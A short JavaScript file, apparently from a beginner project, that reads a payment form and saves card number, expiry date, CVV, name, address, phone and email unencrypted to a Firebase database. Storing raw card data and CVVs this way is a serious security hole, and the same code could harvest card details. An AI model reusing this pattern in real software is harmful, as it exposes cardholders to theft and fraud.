// TODO: Replace the following with your app's Firebase project configuration
var firebaseConfig = {
  apiKey: "AIzaSyCX-oPHwlu_uEhrNYTlU8ZcFDPaTKNJKOQ",
  authDomain: "gdp-app-dbb67.firebaseapp.com",
  databaseURL: "https://gdp-app-dbb67.firebaseio.com",
  projectId: "gdp-app-dbb67",
  storageBucket: "gdp-app-dbb67.appspot.com",
  messagingSenderId: "483028094395",
  appId: "1:483028094395:web:05b54aa719d10231ef089e",
  measurementId: "G-67DHJ32WL0"
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);

var messagesRef = firebase.database().ref('info');

document.getElementById('paymentpage').addEventListener('submit', submitForm);

function submitForm(e) {
  e.preventDefault();

  var cardnumber = getInputVal('cardnumber');
  var expirationdate = getInputVal('expirationdate');
  var cvv = getInputVal('cvv');
  var name = getInputVal('name');
  var firstname = getInputVal('firstname');
  var lastname = getInputVal('lastname');
  var addressline1 = getInputVal('addressline1');
  var addressline2 = getInputVal('addressline2');
  var phno = getInputVal('phno');
  var emailaddress = getInputVal('emailaddress');

  saveMessage(cardnumber, expirationdate, cvv, name, firstname, lastname, addressline1, addressline2, phno, emailaddress);
  

  document.getElementById('paymentpage').reset();
}

function getInputVal(id) {
  return document.getElementById(id).value;

}

function saveMessage(cardnumber, expirationdate, cvv, name, firstname, lastname, addressline1, addressline2, phno, emailaddress) {
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    cardnumber: cardnumber,
    expirationdate: expirationdate,
    cvv: cvv,
    name: name,
    firstname: firstname,
    lastname: lastname,
    addressline1: addressline1,
    addressline2: addressline2,
    phno: phno,
    emailaddress: emailaddress

  });
}
